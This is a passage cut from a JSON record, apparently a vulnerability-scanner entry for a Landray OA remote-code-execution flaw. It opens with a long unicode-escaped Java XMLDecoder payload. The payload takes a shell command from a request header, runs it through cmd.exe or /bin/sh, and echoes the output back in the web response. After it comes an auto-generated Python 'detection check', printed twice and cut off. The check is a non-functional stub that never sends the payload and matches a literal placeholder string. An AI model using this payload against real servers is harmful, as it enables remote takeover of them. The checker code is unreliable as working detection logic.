\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0022\\u0029\\u003b\\u0020\\u007d\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u003b\\u0066\\u0020\\u003d\\u0020\\u006f\\u0062\\u006a\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u004c\\u0069\\u0073\\u0074\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u0020\\u003d\\u0020\\u0028\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u004c\\u0069\\u0073\\u0074\\u0029\\u0020\\u0028\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u006f\\u0062\\u006a\\u0029\\u0029\\u003b\\u0066\\u006f\\u0072\\u0020\\u0028\\u0069\\u006e\\u0074\\u0020\\u006a\\u0020\\u003d\\u0020\\u0030\\u003b\\u0020\\u006a\\u0020\\u003c\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u002e\\u0073\\u0069\\u007a\\u0065\\u0028\\u0029\\u003b\\u0020\\u002b\\u002b\\u006a\\u0029\\u0020\\u007b\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0020\\u003d\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0073\\u002e\\u0067\\u0065\\u0074\\u0028\\u006a\\u0029\\u003b\\u0066\\u0020\\u003d\\u0020\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u0046\\u0069\\u0065\\u006c\\u0064\\u0028\\u0022\\u0072\\u0065\\u0071\\u0022\\u0029\\u003b\\u0066\\u002e\\u0073\\u0065\\u0074\\u0041\\u0063\\u0063\\u0065\\u0073\\u0073\\u0069\\u0062\\u006c\\u0065\\u0028\\u0074\\u0072\\u0075\\u0065\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0072\\u0065\\u0071\\u0020\\u003d\\u0020\\u0066\\u002e\\u0067\\u0065\\u0074\\u0028\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u006f\\u0072\\u0029\\u003b\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u0020\\u0072\\u0065\\u0073\\u0070\\u0020\\u003d\\u0020\\u0072\\u0065\\u0071\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0067\\u0065\\u0074\\u0052\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u0030\\u005d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0071\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u0030\\u005d\\u0029\\u003b\\u0073\\u0074\\u0072\\u0020\\u003d\\u0020\\u0028\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0029\\u0020\\u0072\\u0065\\u0071\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0067\\u0065\\u0074\\u0048\\u0065\\u0061\\u0064\\u0065\\u0072\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0071\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u0022\\u0054\\u0065\\u0073\\u0074\\u0022\\u007d\\u0029\\u003b\\u0069\\u0066\\u0020\\u0028\\u0073\\u0074\\u0072\\u0020\\u0021\\u003d\\u0020\\u006e\\u0075\\u006c\\u006c\\u0020\\u0026\\u0026\\u0020\\u0021\\u0073\\u0074\\u0072\\u002e\\u0069\\u0073\\u0045\\u006d\\u0070\\u0074\\u0079\\u0028\\u0029\\u0029\\u0020\\u007b\\u0020\\u0072\\u0065\\u0073\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0073\\u0065\\u0074\\u0053\\u0074\\u0061\\u0074\\u0075\\u0073\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0069\\u006e\\u0074\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0073\\u0070\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0032\\u0030\\u0030\\u0029\\u007d\\u0029\\u003b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005b\\u005d\\u0020\\u0063\\u006d\\u0064\\u0073\\u0020\\u003d\\u0020\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u002e\\u0067\\u0065\\u0074\\u0050\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0028\\u0022\\u006f\\u0073\\u002e\\u006e\\u0061\\u006d\\u0065\\u0022\\u0029\\u002e\\u0074\\u006f\\u004c\\u006f\\u0077\\u0065\\u0072\\u0043\\u0061\\u0073\\u0065\\u0028\\u0029\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u0022\\u0029\\u0020\\u003f\\u0020\\u006e\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005b\\u005d\\u007b\\u0022\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065\\u0022\\u002c\\u0020\\u0022\\u002f\\u0063\\u0022\\u002c\\u0020\\u0073\\u0074\\u0072\\u007d\\u0020\\u003a\\u0020\\u006e\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005b\\u005d\\u007b\\u0022\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068\\u0022\\u002c\\u0020\\u0022\\u002d\\u0063\\u0022\\u002c\\u0020\\u0073\\u0074\\u0072\\u007d\\u003b\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0020\\u003d\\u0020\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d\\u002e\\u0067\\u0065\\u0074\\u0050\\u0072\\u006f\\u0070\\u0065\\u0072\\u0074\\u0079\\u0028\\u0022\\u006f\\u0073\\u002e\\u006e\\u0061\\u006d\\u0065\\u0022\\u0029\\u002e\\u0074\\u006f\\u004c\\u006f\\u0077\\u0065\\u0072\\u0043\\u0061\\u0073\\u0065\\u0028\\u0029\\u002e\\u0063\\u006f\\u006e\\u0074\\u0061\\u0069\\u006e\\u0073\\u0028\\u0022\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u0022\\u0029\\u0020\\u003f\\u0020\\u0022\\u0047\\u0042\\u004b\\u0022\\u003a\\u0022\\u0055\\u0054\\u0046\\u002d\\u0038\\u0022\\u003b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u0020\\u0074\\u0065\\u0078\\u0074\\u0032\\u0020\\u003d\\u0028\\u006e\\u0065\\u0077\\u0020\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u0053\\u0063\\u0061\\u006e\\u006e\\u0065\\u0072\\u0028\\u0028\\u006e\\u0065\\u0077\\u0020\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072\\u0028\\u0063\\u006d\\u0064\\u0073\\u0029\\u0029\\u002e\\u0073\\u0074\\u0061\\u0072\\u0074\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0049\\u006e\\u0070\\u0075\\u0074\\u0053\\u0074\\u0072\\u0065\\u0061\\u006d\\u0028\\u0029\\u002c\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0029\\u0029\\u002e\\u0075\\u0073\\u0065\\u0044\\u0065\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0072\\u0028\\u0022\\u005c\\u005c\\u0041\\u0022\\u0029\\u002e\\u006e\\u0065\\u0078\\u0074\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0029\\u003b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u0020\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u003d\\u0028\\u0022\\u0045\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u003a\\u0020\\u0020\\u0020\\u0020\\u0022\\u002b\\u006e\\u0065\\u0077\\u0020\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u0028\\u0074\\u0065\\u0078\\u0074\\u0032\\u002c\\u0022\\u0075\\u0074\\u0066\\u002d\\u0038\\u0022\\u0029\\u0029\\u002e\\u0067\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0028\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074\\u004e\\u0061\\u006d\\u0065\\u0029\\u003b\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u0020\\u0063\\u006c\\u0073\\u0020\\u003d\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0022\\u006f\\u0072\\u0067\\u002e\\u0061\\u0070\\u0061\\u0063\\u0068\\u0065\\u002e\\u0074\\u006f\\u006d\\u0063\\u0061\\u0074\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u0062\\u0075\\u0066\\u002e\\u0042\\u0079\\u0074\\u0065\\u0043\\u0068\\u0075\\u006e\\u006b\\u0022\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0063\\u006c\\u0073\\u002e\\u006e\\u0065\\u0077\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065\\u0028\\u0029\\u003b\\u0063\\u006c\\u0073\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0073\\u0065\\u0074\\u0042\\u0079\\u0074\\u0065\\u0073\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u002c\\u0020\\u0069\\u006e\\u0074\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u002c\\u0020\\u0069\\u006e\\u0074\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u006f\\u0062\\u006a\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0030\\u0029\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0049\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0028\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u002e\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068\\u0029\\u007d\\u0029\\u003b\\u0072\\u0065\\u0073\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0064\\u006f\\u0057\\u0072\\u0069\\u0074\\u0065\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0063\\u006c\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0073\\u0070\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u006f\\u0062\\u006a\\u007d\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u004e\\u006f\\u0053\\u0075\\u0063\\u0068\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0076\\u0061\\u0072\\u0035\\u0029\\u0020\\u007b\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u0020\\u0063\\u006c\\u0073\\u0020\\u003d\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0022\\u006a\\u0061\\u0076\\u0061\\u002e\\u006e\\u0069\\u006f\\u002e\\u0042\\u0079\\u0074\\u0065\\u0042\\u0075\\u0066\\u0066\\u0065\\u0072\\u0022\\u0029\\u003b\\u006f\\u0062\\u006a\\u0020\\u003d\\u0020\\u0063\\u006c\\u0073\\u002e\\u0067\\u0065\\u0074\\u0044\\u0065\\u0063\\u006c\\u0061\\u0072\\u0065\\u0064\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0077\\u0072\\u0061\\u0070\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0062\\u0079\\u0074\\u0065\\u005b\\u005d\\u002e\\u0063\\u006c\\u0061\\u0073\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0063\\u006c\\u0073\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u007d\\u0029\\u003b\\u0072\\u0065\\u0073\\u0070\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0022\\u0064\\u006f\\u0057\\u0072\\u0069\\u0074\\u0065\\u0022\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u0043\\u006c\\u0061\\u0073\\u0073\\u005b\\u005d\\u007b\\u0063\\u006c\\u0073\\u007d\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0072\\u0065\\u0073\\u0070\\u002c\\u0020\\u006e\\u0065\\u0077\\u0020\\u004f\\u0062\\u006a\\u0065\\u0063\\u0074\\u005b\\u005d\\u007b\\u006f\\u0062\\u006a\\u007d\\u0029\\u003b\\u0020\\u007d\\u0066\\u006c\\u0061\\u0067\\u0020\\u003d\\u0020\\u0074\\u0072\\u0075\\u0065\\u003b\\u0020\\u007d\\u0069\\u0066\\u0020\\u0028\\u0066\\u006c\\u0061\\u0067\\u0029\\u0020\\u007b\\u0020\\u0062\\u0072\\u0065\\u0061\\u006b\\u003b\\u0020\\u007d\\u0020\\u007d\\u0069\\u0066\\u0020\\u0028\\u0066\\u006c\\u0061\\u0067\\u0029\\u0020\\u007b\\u0020\\u0062\\u0072\\u0065\\u0061\\u006b\\u003b\\u0020\\u007d\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0020\\u0028\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0020\\u0065\\u0029\\u0020\\u007b\\u0020\\u0063\\u006f\\u006e\\u0074\\u0069\\u006e\\u0075\\u0065\\u003b\\u0020\\u007d\\u0020\\u007d</string></void></void></java>"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-sysSearchMain-editParam-rce\nName: Landray-OA - Remote code Execution\nSeverity: critical\nDescription: Landray-OA through sysSearchMain editParam is vulnerable to Remote Code Execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_sysSearchMain_editParam_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-sysSearchMain-editParam-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray-OA - Remote code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Execute:, {{randstr}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Execute:, {{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray-OA - Remote code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_sysSearchMain_editParam_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: landray-oa-sysSearchMain-editParam-rce\nName: Landray-OA - Remote code Execution\nSeverity: critical\nDescription: Landray-OA through sysSearchMain editParam is vulnerable to Remote Code Execution.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_landray_oa_sysSearchMain_editParam_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"landray-oa-sysSearchMain-editParam-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Landray-OA - Remote code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Execute:, {{randstr}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Execute:, {{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Landray-OA - Remote code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_landray_oa_sysSearchMain_editParam_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = 